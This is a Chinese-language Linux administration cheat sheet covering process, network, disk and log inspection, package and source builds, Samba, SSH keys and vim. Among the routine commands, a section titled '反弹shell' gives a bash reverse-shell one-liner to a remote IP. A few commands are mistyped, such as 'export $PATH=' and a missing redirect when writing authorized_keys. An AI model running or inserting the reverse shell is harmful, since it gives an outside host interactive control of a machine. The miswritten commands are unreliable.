# linux系统检查的一般步骤

`who` 或 `w`  #谁在线

`whoami`  #我是谁

`pkill -KILL -t pts/0`  #强制用户退出

`last -n 10` #最近10个登录用户信息

`lastlog` #最近登录信息

`write username pts/3`  #向某个控制台用户username发送信息

`ifconfig -a`  #查看网卡配置

`cat /etc/sysconfig/network-scripts/ifcfg-enp7s0f0`  #查看默认网卡配置

`ctrl+d`  #退出信息编辑

`ctrl+r`  #递归查找命令历史

`pkill -kill -t pts/3`  #踢掉某个在线控制台

`tail -100f /var/log/audit/audit.log`  #查看授权日志

`history -n 100`  #查看历史命令

`pstree -a`  #查看进程数

`ps aux`  #查看所有进程

`ps -A --sort -rss -o comm,pmem,pcpu | uniq -c | head -15` # 查看cpu占用最高的15个进程

`ss -s` #查看socket状态

`netstat -ntlp`  #监听的tcp服务

`netstat -nulp` #监听的udp服务

`netstat -nxlp` #监听的所有服务

`netstat -lpnut`  #查看打开的端口

`netstat -tunl | grep 9000`  #查看9000端口

`lsof -i :端口号`  #查看对应端口的服务

`free -m`   #内存和交换区使用情况

`uptime`   #在线时间

`top`     #进程资源占用信息

`sestatus`  #selinux状态

`mount`  #系统挂载信息

`cat /etc/fstab`  #查看文件系统信息

`vgs`  #卷组系统

`pvs`  #物理卷系统

`lvs`  #逻辑卷系统

`df -lh`  #显示磁盘容量使用情况

`df -i [/var]`  #显示磁盘节点使用情况

`ls -lht`    #查看文件/文件夹大小

`du -sh *`   #查看目录大小

`lsof +D /path`  #列出目录中被打开的文件数

`dmesg`  #查看开机启动信息

`cat /proc/meminfo`  #内存信息

`less /var/log/messages`  #整体系统信息日志

`less /var/log/dmesg`  #内核缓冲信息日志

`less /var/log/auth.log`  #系统授权气质

`less /var/log/boot.log`  #系统启动日志

`less /var/log/lastlog`  #最近登录用户信息

`less /var/log/cups`  #所有打印信息日志

`less /var/log/secure`  #验证和授权信息日志

`last -f /var/log/wtmp`  #登录信息

`sleep 1`   #1秒

`sleep 1s`  #1秒

`sleep 1m`  #1分钟

`sleep 1h`  #1小时

`dd if=/dev/fd0 of=/tmp/tmpfile`  #将/dev/fd0文件复制到/tmp/tmpfile

`dd if=file1 of=file2`  #将file1的内容覆盖file2

`tcpdump -i eth0 src host hostname`  #截获主机hostname发送的所有数据

`tcpdump -i eth0 dst host hostname`  #监视所有发送到主机hostname的数据包

`tcpdump tcp|udp port 80 host hostname` #监视所有发送到主机hostname 80端口的数据包 

`alias bb='aa'` #设置命令aa的别名bb

`unalias bb`  #取消别名bb

`export $PATH=/usr/local/cmake/bin:$PATH`   #添加临时环境变量

`unset [-fv] [变量名]`

`command &`  #让命令自动运行, 已经启动的命令依然attach于当前pts, 只有当前终端模拟器关闭或exit退出时, 进程将被tty继承

`nohup command &`  #不挂起的方式在后台执行命令, 输出结果将保存到nohup.out文件中

`Ctrl+Z`  #将当前运行的进程放到后台运行

`passwd -l user_name`   #锁定用户

`passwd -u user_name`   #解锁用户

`wget [-cr] url` #递归断点下载

`ssh -p port user@host`  #指定端口ssh登录

`ssh -l user host`

`groups user` #查看user所属组

`id root` #查看root用户的id

`\t  缩进   \n  回车    \r   换行    \b  一个黑点  \续行`

`\cp file /path/to/` #直接覆盖拷贝, 不提示

<br/>

# 查看系统tcp连接中各个状态的连接数

`netstat -an | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'`

# 查看和本机80端口建立连接并状态在established的所有ip

`netstat -an |grep 80 |grep ESTA |awk '{print$5 "\n"}' |awk 'BEGIN {FS=":"} {print $1 "\n"}' |sort |uniq`

# 输出每个ip的连接数，以及总的各个状态的连接数

`netstat -n | awk '/^tcp/ {n=split($(NF-1),array,":");if(n<=2)++S[array[(1)]];else++S[array[(4)]];++s[$NF];++N} END {for(a in S){printf("%-20s %s\n", a, S[a]);++I}printf("%-20s %s\n","TOTAL_IP",I);for(a in s) printf("%-20s %s\n",a, s[a]);printf("%-20s %s\n","TOTAL_LINK",N);}'`

# 查看僵尸进程

`ps -A -o stat,ppid,pid,cmd | grep -e '^[Zz]'`

# 释放内存

`echo 3 > /proc/sys/vm/drop_caches`

<br/>

# 目录颜色问题

> 蓝色表示目录；

> 绿色表示可执行文件；

> 红色表示压缩文件；

> 浅蓝色表示链接文件；

> 灰色表示其他文件；

> 红色闪烁表示链接的文件有问题；

> 黄色是设备文件。

<br/>

# 总核数 = 物理CPU个数 X 每颗物理CPU的核数

# 总逻辑CPU数 = 物理CPU个数 X 每颗物理CPU的核数 X 超线程数

# 查看物理CPU个数

`cat /proc/cpuinfo| grep "physical id"| sort| uniq| wc -l`

# 查看每个物理CPU中core的个数(即核数)

`cat /proc/cpuinfo| grep "cpu cores"| uniq`

# 查看逻辑CPU的个数

`cat /proc/cpuinfo| grep "processor"| wc -l`

`cat /proc/cpuinfo |grep MHz|uniq` #查看CPU的主频

`cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c`  #查看cpu型号

`cat /proc/cpuinfo | grep "core id" | uniq | wc -l`  #所有物理cpu上core的个数

`getconf LONG_BIT` #查看位数

`lscpu`  #查看cpu信息概要

`arch`   #查看cpu架构

# 进入单用户模式

> 在系统启动过程中, 按下e进入grub, 再次按下e进入启动选项, 选择kernel所在行, 输入single回车, 输入b重启. 进入系统后就是单用户模式了, 你可以修改root密码.


# 升级glibc
`lsof | grep libc | awk '{print $1}' | sort`  #查看依赖glibc的服务

`yum -y update glibc` #升级glibc

`sudo restart`  #重启系统

# kill命令相关

> 当你执行一个`kill`命令, 你实际上发送了一个信号给系统, 让它去终结不正常的应用.

`kill -l`  #查看所有信号列表

> 常用的信号也就`1) SIGHUP`, `2) SIGINT`, `9) SIGKILL`, `15) SIGTERM`, `10) SIGUSR1`, `12) SIGUSR2`

> `SIGHUP`信号请求挂起进程, 也可用于在修改配置以后重载进程.

> `SIGINT`信号请求中断一个信号.

> `SIGKILL`信号强制进程立刻停止运行, 进程不能忽略此信号, 而未保存的进度将会丢失.

> `SIGUSR1`信号请求进程重新载入配置文件, 比如向nginx服务器发送该信号, 可以重载配置, 重新打开日志文件.

> `SIGUSR2`信号与`SIGUSR1`类似, 可用于重启某些服务.

> `SIGTERM`信号请求一个进程停止运行, 进程可以忽略. 进程需要一段时间保存进度并释放资源, 然后再正常关闭.

`kill [信号名或信号编号] PID(s)` #发送信号给进程, 多个进程id之间用空格隔开

`kill SIGKILL 8080` 或者 `kill -9 8080`  #杀死进程id为8080的服务

`pkill chrome` #pkill允许使用扩展的正则表达式匹配服务

`killall chrome`  #killall会杀死所有同名进程

`xkill` #xkill是图形方式kill一个应用, 一般不用
<br/>

# 定时任务
```
/etc/crontab  编辑定时任务后需要重启crond服务
crontab -e    编辑保存后即可生效
分      小时    日    月       星期    命令
0-59    0-23    1-31  1-12     0-6      command
* 代表取值范围内任意数字
/x 代表每隔x
- 代表从x到y
, 用于离散数字
```

`tar czvf file.tar files`  #压缩files为file.tar 

`tar xf file.tar`   #解压file.tar到当前目录

`tar -tvf file.tar`  #不解压tar包查看内容

`tar zxvf xxx.tar.gz -C /usr/local/xxx`  #指定路径

`tar xvf xxx.tar`

`tar jxvf xxx.tar.bz2`

`xz -d xxx.tar.xz`

`unzip xxx.zip`

`unzip -r xxx.zip abc.txt dir1` #把abc.txt和目录dir1压缩为xxx.zip

`unzip abc\?.zip` #解压多个匹配的压缩包

`unzip -v large.zip`  #查看large.zip的内容

`unzip -t large.zip` #验证large.zip是否完整

`unzip -j music.zip`  #解压到第一级目录

`rpm -ivh  --prefix=/usr/local/xxx xxx.rpm`  #指定安装路径

`rpm -Uvh xxx.rpm`  #升级安装软件包

`rpm -e --nodeps xxx.rpm`  #删除制定包，忽略依赖包

`rpm -ivh *.rpm --force --nodeps`   强制安装

`rpm --import /etc/pki/rpm-gpg/RPM*`    导入密钥

`rpm -ql xxx`  #查看软件安装位置

# find pathname -options [ -print -exec -ok ...]

```
pathname 目录路径，.表示当前目录，/表示根目录
-print 输出到标准输出中
-exec 对匹配的文件执行该参数所给出的shell命令
-ok 对话形式完成shell命令
-name 按照文件名查找文件
-perm 按照文件权限查找文件
-user  根据文件属主查找文件
-type  吵着某一类型文件
xargs  配合find将参数列表转换成小块分段传递给其他命令。
反引号`` 用于变量转义为shell命令被执行
find /path -type f -exec rm '{}' \  #删除目录下所有文件
find ./ -type d -exec chmod 755 {} \; #当前目录下所有目录赋权755
 xargs 命令传递参数过滤器
find ./ -name '*.log' | xargs ls -l  #把当前目录下所有log文件的详细信息列出
find ./ -name '*.log' | xargs rm -f  #删除
```

# 用户、组权限、添加删除用户等
```
/etc/passwd  
daemon:x:2:2:daemon:/sbin:/sbin/nologin 
注册名：口令：UID：GID：user：user_home：user_shell
/etc/shadow  需管理员权限, 与/etc/passwd一一对应
/etc/group 
用户组：口令：GID:user
/etc/gshadow
useradd  [-c comment] [-d home_dir] [-e expire_date] [-f inactive_time] [-g inital_group] [-G group] [-s shell] [-m] username
userdel  [-r] username     #带参数则同时删除家目录和邮箱文件
userdel -f username        #强制删除用户, 即使用户已经登录
usermod [option] username  #修改用户帐号的各项设定
groupadd [-g gid] [-o] [-r] [-f] group  #新增组
groupdel group  #删除组
groupmod [-g gid] [-n gid_new] #修改群组识别码或名称
passwd [-l] [-u] [-d] [-S] username #操作用户密码
-l 锁定 -u 解锁 -d 删除口令 -S 查看状态
su - [user]   #切换到指定用户的变量, 缺省为root
su [user]     #切换到指定用户, 不改变当前变量, 缺省为root
```

# cut [-bn] [file] 或 cut [-c] [file] 或 cut [-df] [file]

```
-b：以字节为单位分割; -c：以字符为单位分割; -n：取消分割多字节字符，与-b一起使用;
-d：自定义分隔符，默认为制表符; -f: 与-d一起使用，指定显示哪个区域;
who | cut -b 3-5,8 #显示第3到第5个字节，第8个字节
who cut -b 3- #显示从第三个字节到行尾
who cut -b -3 #显示第一到第三个字节
cut -b 3 aaa.txt #显示aaa.txt每行第三个字符
cat /etc/passwd | cut -d: -f 1,3-5  #以:为分隔符，显示第1列，第3到第5列
判断空格和制表符:  sed -n l aa.txt  #若为制表符,则显示\t
cat /home/aa.txt | cut -f 1 #以制表符为分隔符，显示第一列
```

# lsof
```
lsof -i:22 显示22端口运行情况
lsof -i :1-1024 列出端口在1-1024之间的所有进程
lsof -i 4 只列出使用IPv4的打开文件
lsof file_name 显示打开指定文件的所有进程
lsof -c str  显示cmd中包含指定字符的进程
lsof -u user_name 显示指定用户名的进程
lsof +D /dir/ 显示目录下被进程打开的文件
lsof -p PID 根据进程id来列出打开的文件
killall -9 `lsof -t -u username`  杀死某个用户的所有活动进程
lsof –n | grep deleted  查找已删除文件的读写操作
```

# 挂载外接设备

```
fdisk -l   查看磁盘分区情况
mount -t vfat /dev/sdb /mnt/usb
mount -t ntfs-3g /dev/sdb /mnt/winC
mount -t iso9660 /dev/cdrom /mnt/cdrom  
umonut /mnt/xxx  #卸载
badblocks -v /dev/sda  查看挂载硬盘是否有坏块
mdadm /dev/md0 -remove /dev/sdc1   删除一块硬盘
mdadm /dev/md0 -add /dev/sdc1  添加一块硬盘
cat /proc/mdstat   查看磁盘阵列信息
fdisk /dev/sdb  对磁盘编辑分区
n 创建新分区  p 创建主分区  e 创建扩展分区  
1 创建第一个主分区  t 指定分区类型   w 写盘  
mdadm -C /dev/md0 -l5 -n3 /dev/sd[bcd]1 在三个分区上创建raid5
mkfs.ext3 /dev/md0  格式化md0分区
make  /raid5disk
mount /dev/md0 /raid5disk/
/etc/fstab  设置为自动挂载
mdadm -D /dev/md0  查看md0
```

# sort [-bcfMnrtk] [源文件] [-o 输出文件]

```
-b 忽略每行前面开始出现的空格字符
-c 检查文件是否已按照顺序排序
-f 排序时，忽略大小写
-M 将前面3个字母按月份的缩写进行排序
-n 依照数值的大小进行排序
-o<输出文件> 将排序结果存入指定文件
-r 以相反顺序排序
-t<分隔符> 指定排序时所用的栏位分割字符
-k 选择以哪个区间进行排序
-u 去除重复行
sort a.txt > b.txt  对a.txt中内容排序后将结果保存在b.txt
sort -n -k 2 -t ‘:’ a.txt    #对a.txt中内容按第2区间数值大小排序，分隔符为’:’
```

# cURL 网络传输工具 不支持跳转

```
curl --head|-I http://www.baidu.com/  #返回header
curl --connect-timeout 3 -m 5 -I -s "http://search.sotuhcn.com/index.jsp" | grep -q 'HTTP/1.1 200 OK'
-H/--header <header> 指定请求头
-s/--slient 减少输出的信息，比如进度
-x/--proxy <proxyhost[:port]> 指定代理服务器地址和端口，默认端口1080
-d/--data/--data--data-ascii <data> 指定post的内容
-e/--referer <URL>指定引用地址
-I/--head 仅返回头部信息
-v/--verbose  用于打印更多信息
-m/--max-time <seconds>  指定处理的最大时长
--connect-timeout <seconds>  指定尝试连接的最大时长
-o/--output <file> 指定输出文件名称
-T/--upload-file <file> 指定上传文件路径
--retry <num> 指定重试次数
```
# ssh启动失败, 缺失共享库文件怎么办?

```
mount /dev/sr0 /mnt/cdrom 
rpm -ivh /123/Packages/yum*
rpm -ivh /123/Packages/yum-3.2.29-30.el6.centos.noarch.rpm --froce
rpm -ivh /123/Packages/yum-3.2.29-30.el6.centos.noarch.rpm --force
ll /etc/yum.repos.d/
yum install openssh*
rpm -ivh /123/Packages/openssl* --force
rpm -ivh /123/Packages/openssl-1.0.0-20.el6_2.5.i686.rpm --force
rpm -ivh /123/Packages/openssl-devel-1.0.0-20.el6_2.5.i686.rpm --force
rpm -ivh /123/Packages/openssl* --nodeps
yum install openssh*
yum update openssl
service sshd start
service sshd restart
yum remove openssl*
yum remove openssl
yum install -y yum-downloadonly openssl
yum install -y yum-downloadonly --downloaddir=/opt openssl
yum install -nogpgcheck openssl_need_to_instaal
service sshd start
init 6
logout
```
<br/>

# 用户间发送消息（以CentOS为例）
## 1、wall '...'

> wall是给所有用户发送消息, 消息内容用''包含

## 2、write userName tty

> 先用`who`命令查看在线的用户以及他们的tty, 然后用`write`命令给他发消息

> 输入`write`就进入了消息模式, 此时输入消息内容, 回车就可以发送. 退出按`Ctrl+D`

## 3、mesg

> 如果不希望接受其他用户write的消息, 用`mesg -n`关闭, 再次开启用`mesg -y`

## 后台进程退出

> 用Ctrl+Z可将当前任务放在后台执行，执行完成之前，不能用logout来退出终端。

> 可以用fg %1查看并停止该任务，用kill %1彻底结束任务。

<br/>

## tee命令

> 双向重定向, 同时将数据流送与文件和屏幕, 而输出到屏幕的就是stdout, 可以让下一命令继续处理.

`last | tee -a last.list | sed -n '1p'`

# io检测

`yum install iotop`

`yum install sysstat`

`iostat -d -x -k 2 10` #查看设备使用状态,-x表示扩展信息,-k强制使用kb为单位,每2秒刷新一次,10次后退出

`iostat -d sda 2 10` #指定设备sda

`iostat -d -m 2`  #以mb为单位

`iostat -c 1 10`  #cpu状态信息

```
rrqm/s:  每秒进行merge的读操作数目
wrqm/s: 每秒进行merge的写操作数目
r/s: 每秒完成读I/O设备次数
rsec/s: 每秒读扇区数
wsec/s: 每秒写扇区数
rkB/s wkB/s  每秒读写K字节数
avgrq-sz: 平均每次设备I/O操作的数据大小(扇区)
avgqu-sz: 平均I/O队列长度
await: 平均每次设备I/O操作的等待时间（await大于svctm）
svctm: 平均每次设备I/O操作的服务时间
%util:  一秒中用于I/O操作的时间占比
```

# 测试io读

`hdparm -t --direct /dev/sda3`

# 测试io写

`sync;`

`/usr/bin/time -p bash -c "(dd if=/dev/zero of=test.dd  bs=1000K count=20000;sync)"`  #先刷新文件系统缓冲区,time命令用户测试命令执行时间,bash -c 表示将后面的字符串当脚本执行

`dd bs=1M count=20000 if=/dev/zero of=test.dd conv=fdatasync`  #dd命令测试IO顺序读写

<br/>

# sysctl命令相关

`sysctl -a` #显示所有系统参数

`sysctl -a | grep syn`  #查看SYN相关参数

`sysctl -w net.ipv4.tcp_syn_retries = 3`  #修改tcp_syn_retries次数

`sysctl -w net.ipv4.tcp_synack_retries = 3` #修改tcp_synack_retries参数

<br/>

# 反弹shell

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

<br/>

# 解决task nrpe: blocked for more than 120 seconds

> 原理：linux会设置40%的可用内存用来做系统cache，当flush数据时这40%内存中的数据由于和IO同步问题导致超时(120s)，所将40%减小到10%，避免超时

> 在文件/etc/sysctl.conf中加入 vm.dirty_ratio=10

<br/>

# 关闭`/var/spool/mail/root`提醒

`vim /etc/profile`

`unset MAILCHECK`

`source /etc/profile`

<br/>


# top命令

```
load average: 0.18, 0.19, 0.90
系统负载,任务队列的平均长度. 分别是1分钟/5分钟/15分钟到现在的平均值.

Tasks: 892 total,   1 running, 891 sleeping,   0 stopped,   0 zombie
进程总数892个,1个运行中,891个睡眠,0个停止,0个僵尸.

Cpu(s):  0.1%us,  0.0%sy,  0.0%ni, 99.9%id,  0.0%wa,  0.0%hi,  0.0%si,  0.0%st
用户空间us,内核空间sy,用户进程空间改变过优先级的进程ni,空闲id,等待wa,


Mem:  32798616k total, 30971312k used,  1827304k free,   139884k buffers
内存信息: 总量, 已使用, 空闲, 用作内核缓存的

Swap: 30716272k total,    17444k used, 30698828k free, 29417708k cached
交换区: 总量,已使用,空闲,缓冲

PID #进程id
USER #用户
PR  #优先级
NI  #nice值,数值越小优先级越高
VIRT  #进程使用的虚拟内存总量 VIRT=SWAP+RES
RES  #进程使用的、未被患处的物理内存大小,单位kb RES=CODE+DATA
SHR #共享内存
S  #进程状态,S=睡眠,R=运行,Z=僵尸,D=不可中断的睡眠状态
%CPU  #CPU时间占用百分比
%MEM   
TIME+  #进程使用的CPU时间总计
COMMAND #进程命令


交互模式下的参数
c #切换显示模式
d #改变刷新频率
i #不显示闲置进程
n #更新次数
q #实时
s #安全模式
M #按%Mem排行
P #按%CPU排行
T #按TIME+排行
```

<br/>

# 流量监控工具iftop安装与使用

```
# 先安装依赖
yum install -y flex byacc libpcap ncurses ncurses-devel libpcap-devel

# 安装libpcap
wget -c http://www.tcpdump.org/release/libpcap-1.8.1.tar.gz
tar zxvf libpcap-1.8.1.tar.gz
cd libpcap-1.8.1
./configure
make && make install

# 安装iftop
yum install flex byacc libpcap ncurses ncurses-devel libpcap-devel
wget -c http://www.ex-parrot.com/pdw/iftop/download/iftop-0.17.tar.gz
tar zxvf iftop-0.17.tar.gz
cd iftop-0.17.tar.gz
./configure
make && make install

# iftop使用
iftop 
[-i eth0] #指定监测的网卡
[-B] #以bytes为单位,默认是bits
[-n] #使host信息默认直接显示ip
[-N] #使端口信息默认显示端口号
[-F 10.10.1.0/24] #指定网段进出流量

```

<br/>

# php程序502排查
`netstat -anpo | grep "php-fpm" | wc -l`  #查看php-fpm连接数

`cat nginx.conf`  #查看fastcgi-conncet-timeout等参数值

`cat php.ini`  #增大memory_limit值, 一般设为内存的1/4

`cat php-fpm.conf`  #max_children值 

`netstat -np | grep 127.0.0.1:9000` #统计php-fpm连接数

`pgrep php-fpm | head -10`  #查看php-fpm进程号pid

<br/>

# ssh登录很慢的问题解决

`vi /etc/ssh/sshd_config`

`UseDNS no`

<br/>

# mysql重置密码

先停止mysql服务`service mysqld stop`, 然后以不检查权限方式启动服务`./mysqld_safe --skip-grant-tables &`, 就可以无密码登录了.

<br/>

# psftp命令

`help` #查看帮助

`open abc.edu` #连接到abc.edu   

`! md test`  #执行DOS指令建立一个test目录 

`binary`  #二进制

`passive`  #主动模式

`bye` #结束离开 exit也有相同效果

`cd test`  #切换远端主机工作目录至test

`chmod 700 abc.txt` #把文件abc.txt 设成本人才能存取！

`del 111.bmp`  #删除文件111.bmp rm指令效果相同

`dir` #显示目前目录中的文件 

`get 321.doc` #下载文件321.doc 

`mget aa.txt bb.txt` 下载多个文件

`lcd c:\windows` #切换本机工作目录至c:\windows

`mkdir test` #建立目录test 

`put 555.txt`  #上传文件555.txt 

`mput aa.txt bb.txt`  #传多档

`pwd` #显示目前所在的目录位置(远端主机) 

`ren 123.txt myfile.txt`  #把文件123.txt档名改成myfile.txt mv指令亦可

`rmdir test` #删除目录test

<br/>

# 一些概念

`shell`：直接和内核进行通信。

`xterm`: 是软件概念，可以通过这个程序连接到`console`，从而控制主机。可以理解为cli形式的终端模拟器，而gnome-terminal是gui形式的终端模拟器。

`console`：是主机的控制台，是一个物理概念。

`tty/pty/pts`都是终端，是硬件或设备概念。

`tty`是所有终端设备的总称。

`pty`是其中一类伪终端，或者叫虚拟终端。

# 一些题目

## 1、输出一个文件的第十行，以下三种方法

`awk 'NR == 10' file.txt`

`sed -n '10p' file.txt`

`tail -n+10 file.txt | head -n1`

## 2、输出有效的电话号码

`cat file.txt | grep -Eo '^(\([0-9]{3}\) ){1}[0-9]{3}-[0-9]{4}$|^([0-9]{3}-){2}[0-9]{4}$'`

`^(\([0-9]{3}\) ){1}[0-9]{3}-[0-9]{4}$` 匹配形如(123) 456-7890的电话号码

`^([0-9]{3}-){2}[0-9]{4}$` 匹配形如987-123-4567的电话号码

## 3、转置文件内容

> 比如file.txt内容如下：

> aaa  bbb

> ccc  ddd

> 则输出

> aaa   ccc

> bbb  ddd

`awk ' { for (i = 1; i <= NF; i++) { a[NR, i] = $i } } NF > p { p = NF } END { for (j = 1; j <= p; j++) { str = a[1, j] for (i = 2; i <= NR; i++){ str = str " " a[i, j] } print str } }' file.txt`

## 4、词频统计

`cat words.txt | tr -s ' ' '\n' | sort | uniq -c | sort -rn | awk '{print $2" "$1}'`

> tr -s: 使用指定字符串替换出现一次或者连续出现的目标字符串（把一个或多个连续空格用换行符代替）

> sort: 将单词从小到大排序

> uniq -c: uniq用来对连续出现的行去重，-c参数为计数

> sort -rn: -r 倒序排列， -n 按照数值大小排序

> awk '{ print $2, $1 }': 格式化输出，将每一行的内容用空格分隔成若干部分，$i为第i个部分。

## 5.统计/etc/passwd的文件名，行号，列数，每行内容

`awk  -F ':'  '{printf("filename:%10s,linenumber:%s,columns:%s,linecontent:%s\n",FILENAME,NR,NF,$0)}' /etc/passwd`

## 6.统计用户个数

`awk 'BEGIN {count=0;print "[start]user count is ", count} {count=count+1;print $0;} END{print "[end]user count is ", count}' /etc/passwd`

## 7.以MB为单位统计某个文件夹下的文件占用字节数，不包括子目录

`ls -l | awk 'BEGIN {size=0;} {if($5!=4096){size=size+$5;}} END{print "[end]size is ", size/1024/1024,"M"}'`

`ls -l | grep "^-" | wc –l`   #统计文件个数

`ls -l | grep "^d" | wc –l`   #统计目录个数

`ls -lR | grep "^-" | wc –l`  #统计所有文件个数，包括子目录


## curl ssl connect error问题解决方案

先去[官网](https://curl.haxx.se/download/archeology/)下载curl对应版本, 然后重新编译安装

`./configure --prefix=/usr --without-nss --with-ssl`

`make && make install`

`ldconfig`

`curl -V`

重启nginx和php-fpm搞定.

## 编译安装nginx

`tar zxvf nginx-1.13.5.tar.gz`

`cd nginx-1.13.5`

`mkdir -p /usr/local/nginx/html`

`groupadd www && useradd -g www -s /bin/false -d /usr/local/nginx/html www`

`./configure --prefix=/usr/local/nginx --user=www --group=www --sbin-path=/usr/local/nginx/sbin/nginx --conf-path=/usr/local/nginx/conf/nginx.conf --pid-path=/usr/local/nginx/logs/nginx.pid --without-http_memcached_module --with-http_ssl_module --with-http_realip_module --with-http_addition_module --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gzip_static_module --with-http_random_index_module --with-http_secure_link_module --with-http_stub_status_module --with-http_auth_request_module --with-threads --with-stream --with-stream_ssl_module --with-http_slice_module --with-mail --with-mail_ssl_module --with-file-aio --with-http_v2_module --with-pcre=/usr/local/src/pcre-8.41 --with-zlib=/usr/local/src/zlib-1.2.11 --with-openssl=/usr/local/src/openssl-1.0.2l`

`make && make install`

<br/>

## 升级Python版本

`python -V` #查看当前版本

`tar -xvf Python-2.7.10.tgz`

`cd Python-2.7.10`

`./configure --prefix=/usr/local/python2.7`

`make && make install`

`/usr/local/python2.7/bin/python2.7 -V`  #验证版本

`ln -s  /usr/local/python2.7/bin/python2.7 /usr/bin/python27`  #创建文件软链

`python27 -V`

<br/>


## 编译安装pcre

`tar zxvf pcre-8.41.tar.gz`

`cd pcre-8.41`

`./configure --prefix=/usr/local/pcre-8.41 --libdir=/usr/local/lib/pcre --includedir=/usr/local/include/pcre`

`make && make install`

`mv /usr/bin/pcregrep /usr/bin/pcregrep.bak`

`mv /usr/bin/pcretest /usr/bin/pcretest.bak`

`ln -s /usr/local/pcre-8.41/bin/pcregrep /usr/bin/pcregrep` # 替换旧的pcregrep

`ln -s /usr/local/pcre-8.41/bin/pcretest /usr/bin/pcretest` # 替换旧的pcretest

`echo "/usr/local/lib/pcre" >> /etc/ld.so.conf`

`ldconfig -v`  # 更新动态库数据

`pcregrep -V`  #查看版本


<br/>

## jdk安装配置

- 1、jdk的安装

`rpm -ivh --prefix=/usr/local/   jdk-7u55-linux-i586.rpm`

- 2、安装tomcat

`tar zxvf apache-tomcat-7.0-53.tar.gz -C /usr/local/tomcat`

- 3、配置环境变量
- 
```
vi /etc/profile

JAVA_HOME=/usr/local/jdk1.7.0_55
CLASSPATH=.:$JAVA_HOME/lib/tools.jar
TOMCAT_HOME=/usr/local/tomcat
CATALINA_HOME=/usr/local/tomcat
PATH=$JAVA_HOME/bin:$PATH
export JAVA_HOME CLASSPATH TOMCAT_HOME CATALINA_HOME PATH

source /etc/profile
```

<br/>

## 编译安装perl

`wget http://www.cpan.org/src/5.0/perl-5.24.1.tar.gz`

`tar -xzf perl-5.24.1.tar.gz`

`cd perl-5.24.1`

`./Configure -des -Dprefix=$HOME/localperl`

`make && make test && make install`

- 替换系统自带版本

`mv /usr/bin/perl /usr/bin/perl.bak`

`ln -s /usr/local/perl/bin/perl /usr/bin/perl` 

- 检查perl版本

`perl -v`

- 安装perl模块

`perl -MCPAN -e shell` # 进入命令行模式

`cpan[1]> install DBI`

<br/>

## 编译安装zlib

`./configure --prefix=/usr/local/zlib`

`make && make install`

`cd /etc/ld.so.conf.d/`

`vi zlib.conf` # 编辑配置文件

`/usr/local/zlib/lib`  # 写入配置文件

`ldconfig`  # 更新动态库数据

<br/>

### [Redis安装配置](http://www.redis.io/) 
```
wget http://download.redis.io/release/redis-2.8.3.tar.gz
tar xzf redis-2.8.3.tar.gz
cd redis-2.8.3
make   #编译之后，在src目录下，将redis-server、redis-cli、redis-benchmark、redis.conf拷贝到同一目录下，例如/usr/redis
redis-server redis.conf   #启动redis服务
redis-server redis.conf 1>log.log 2>errlog.log  #1为标准输出，2为错误输出
echo /usr/redis/redis-server /etc/rc.local  #随系统启动而启动服务
redis-cli  #客户连接测试
redis-cli shutdown  #停止服务
```

### phpredis key-value存储系统
```
tar zxvf phpredis-2.x.x.tar.gz
cd phpredis-2.x.x.tar.gz
cd phpredis-2.x.x.tar.gz
/usr/local/php/bin/phpize
./configure --with-php-config=/usr/local/php/bin/php-config
make && make install
echo "extension=\"redis.so\"" >> php.ini
```

### Samba 实现跨系统的网络资源共享
```
需要开放的端口 udp 137 udp 138 tcp 139 tcp 445
vi /etc/samba/smb.conf
workgroup = WORKGROUP #设定Samba Server所要加入的工作组或域
server string = Samba Server  #设置samba服务器的主机名称
security = user  #设置samba服务器的安全级别为user
netbios name = SambaServer  #设置samba服务器访问别名
interfaces = lo eth0 192.168.12.2/24  #samba服务器监听的网卡或ip地址
hosts allow = 127. 192.168.1. 192.168.10.1 #允许的客户端
hosts deny = 192.168.1.EXCEPT192.168.1.5 #除192.168.1.5全禁止
[SambaServer]
comment = SambaServer  #在Windows网上邻居看到的共享目录的名字
path = /home/SambaServer  #共享目录在系统中的位置
public = no    #不公开目录
writable = yes   #共享目录可以读写
valid users=sambaUser  #只允许sambaUser用户访问
 
# 开启服务
systemctl start nmb.service   #nmbd服务提供了NetBIOS主机名称的解析
systemctl start smb.service   #smbd服务为客户机提供了服务器中共享资源的访问

# 添加访问linux共享目录的帐号sambaUser
useradd sambaUser -d /home/sambaUser -s /bin/false
chown sambaUser:sambaUser /home/sambaUser -R

# 将用户sambaUser添加入Samba用户数据库，并设置登录密码
smbpasswd -a sambaUser

于是可在Windows客户端输入 \\ip或者\\SambaServer登录访问共享目录
```

### Linux使用密钥认证登录SSH
```
1、linux下创建密钥对
mkdir   /root/.ssh
chmod 700 ~/.ssh
ssh-keygen -t rsa -b 1024 #直接回车默认路径
#输入密码短语并重复确认，也可以不输，这样登陆时就不用密码了
cat id_rsa.pub authorized_keys  #把公钥输出到默认的认证文件中
chmod 600 ~/.ssh/authorized_keys
把私钥id_rsa的内容复制出来保存，然后重启sshd服务

2、若用putty认证登录，则需要用puttygen来转换私钥格式，也就是用puttygen来加载id_rsa文件，转换之后，保存私钥。然后打开putty，在"连接" -> "SSH" -> "认证"，加载私钥文件。在"连接" -> "数据"，写入自动登录用户名。在"回话"填入主机名，然后点击打开即可实现密钥认证登录了。

3、若用SecureCRT登录，则Quick Conncet -> 写入hostname，认证方式把Publickey作为首选并单独选中，点击Properties加载私钥文件确定 -> 输入用户名即可。 

4、也可以Windows下putty创建密钥对。

5、修改/etc/ssh/sshd_config

PasswordAuthentication no   #禁止密码认证, 就只能用公钥私钥认证登录了
#Port  22
port 22661   #修改ssh默认端口
PermitRootLogin no  #禁止root直接ssh登录

6、重启sshd服务
systectml restart sshd.service
```

### vi/vim几个常用命令
```
v #进入视图模式
k/j  #向上/下选中

一、删除
dd   #删除当前行
ndd  #删除当前行开始的n行
dw   #删除当前字符
ndw  #删除当前字符开始的n个字符
d$ 或 D  #删除当前字符到行尾的字符
d)   #删除到下一句的开始
d}   #删除到下一段的开始
d回车  #删除两行
dG   #全部删除
二、复制
9, 15 copy 16  #复制9到15行到16行
9, 15 move 16  #移动9到15行到16行
ggyG  #全部复制
ggvG  #全选高亮


:set number  显示行号
:n   跳转到第n行
:wq   写入并退出
:q  退出
zz  保存并退出
:q!  退出不保存
dd 删除光标所在行
:e 打开并编辑指定名称的文件
a, A 在本行末尾之后开始插入
i, I 在光标后插入
